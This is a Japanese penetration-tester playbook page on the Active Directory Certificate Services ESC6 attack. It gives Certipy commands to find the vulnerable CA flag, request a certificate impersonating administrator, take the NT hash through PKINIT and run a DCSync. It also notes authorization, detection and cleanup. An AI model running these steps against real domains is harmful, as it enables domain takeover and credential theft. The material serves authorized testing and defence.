# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA フラグ

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（任意ユーザー名で発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

以下のすべてが揃ったときに実施する：

- Certipy の出力の CA セクションに `User Specified SAN: Enabled` と表示されている
- または `[!] Vulnerabilities: ESC6` が表示されている
- 加えて、低権限ユーザーが Enrollment 権限を持つ **Client Authentication EKU を含む任意テンプレート** が存在する

**攻撃者の思考トレース：** ESC1 は「テンプレートに `ENROLLEE_SUPPLIES_SUBJECT` フラグが設定されている」ことが条件だが、ESC6 は CA 全体のフラグ（`EDITF_ATTRIBUTESUBJECTALTNAME2`）が有効なため、テンプレート側のフラグが False でも SAN を自由に指定できる。Certipy の `find` で個別テンプレートが安全に見えても CA フラグを確認しないと見落とす。

---

## 環境前提

- **実行環境**: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- **必要なツール**: Certipy（`pip install certipy-ad --break-system-packages`）
- **必要な権限**: Client Authentication テンプレートへの Enrollment 権限を持つドメインユーザー（低権限ユーザーで可）
- **オフライン代替**: `certreq` + 手動 INF ファイルで SAN を指定した CSR を作成（Windows 端末要）

---

## 観点・着眼点

### 先に確認すること：CA フラグの確認

```bash
# [Attacker] CA 設定を含む詳細列挙
certipy find \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

ESC6 の出力例（CA セクション）：

```
Certificate Authorities
  0
    CA Name                             : [CA_NAME]
    DNS Name                            : [CA_SERVER_FQDN]
    ...
    User Specified SAN                  : Enabled         ← ESC6 の核心条件
    Request Disposition                 : Issue
    ...
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition
                                          is set to Issue. Does not work after May 2022 patch.
```

> **重要**: Microsoft は 2022 年 5 月のパッチ（KB5014754）以降、`EDITF_ATTRIBUTESUBJECTALTNAME2` フラグが有効でも Strong Mapping による証明書と AD アカウントの厳密な対応検証が行われるため、パッチ適用済み DC では ESC6 の効果が制限される場合がある。`certipy find` の出力にこの警告が表示される。

### 使用するテンプレートの選定

ESC6 は「Client Authentication EKU を持つ任意の登録可能テンプレート」で成立する。推奨する使用テンプレートの優先順位：

| 優先度 | テンプレート | 備考 |
|-------|------------|------|
| 1位 | `User` | デフォルト存在。Domain Users が Enrollment 可能 |
| 2位 | `Computer` | コンピューターアカウント向けだが Domain Users から申請できる環境もある |
| 3位 | カスタムテンプレート | `certipy find` で `Client Authentication: True` かつ低権限ユーザーが Enrollment 権限を持つテンプレート |

---

## 手順

事前準備（必須）：時刻同期

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

### Step 1: 任意の Client Auth テンプレートで UPN を指定して証明書申請

```bash
# [Attacker] User テンプレートを使い、UPN を administrator に偽装して証明書申請
certipy req \
  -ca [CA_NAME] \
  -template User \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -upn administrator@[DOMAIN]
# ESC6 フラグが有効なため、テンプレートの Enrollee Supplies Subject が False でも UPN を指定できる
# → administrator.pfx が生成される
```

### Step 2: 証明書で PKINIT 認証 → NT ハッシュ取得 → DCSync

```bash
# [Attacker] PKINIT 認証 → NT ハッシュ取得
certipy auth \
  -pfx administrator.pfx \
  -dc-ip [DC_IP]

# [Attacker] NT ハッシュで DCSync
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/administrator@[DC_IP]
```

詳細フロー → `ESC1.md`（Step 2・Step 3 と同一）

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy find` で `User Specified SAN: Enabled` が表示されるが証明書申請が拒否される | テンプレートが `-upn` を受け付けない設定の可能性。別テンプレートを試す |
| KB5014754 適用済みで `certipy auth` が失敗する | DC が Strong Mapping を要求している。`-ldap-shell` オプションを使って証明書と AD アカウントのマッピングを確認 |
| `User Specified SAN: Disabled` | ESC6 の条件を満たさない。ESC1 / ESC2 / ESC3 で代替を探す |
| テンプレート `User` の Enrollment 権限がない | `certipy find` で自グループが Enrollment 可能なテンプレートを探す |

---

## 注意点・落とし穴

- **KB5014754（2022年5月以降）パッチ対応**：パッチ適用済み環境では Strong Certificate Mapping が有効となり、証明書の UPN とAD アカウントの厳密な対応が必要になる。`certipy find` が警告を表示する場合は事前に確認する
- **ESC6 は CA フラグ。テンプレートを見ていても気づかない**：`certipy find` の出力は `Certificate Authorities` セクションも必ず確認すること
- **CA フラグの無効化は管理者権限が必要**：CA フラグ自体を原状回復させるには CA サーバーへの管理者アクセスが必要。テスターは証明書失効のみを担当する

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。任意ユーザーとして証明書を発行するためドメイン全体への影響
- **想定されるSIEM/EDR検知**: Event ID 4886（証明書要求受信）/ 4887（証明書発行）/ 4768（TGT 要求）/ MDI「疑わしい証明書の使用」
- **業務影響リスク**: 証明書発行自体は業務影響なし。DCSync は書面承認必須
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効（`certipy ca -revoke [REQUEST_ID]`）/ ✅ pfx・NT ハッシュ・TGT の暗号化保管・テスト完了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定（CA セクションの `User Specified SAN` 確認が必要） → `./Overview.md`
- 前：ESC1（テンプレートレベルの ENROLLEE_SUPPLIES_SUBJECT 版） → `./ESC1.md`
- 後：証明書取得後 → PKINIT → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
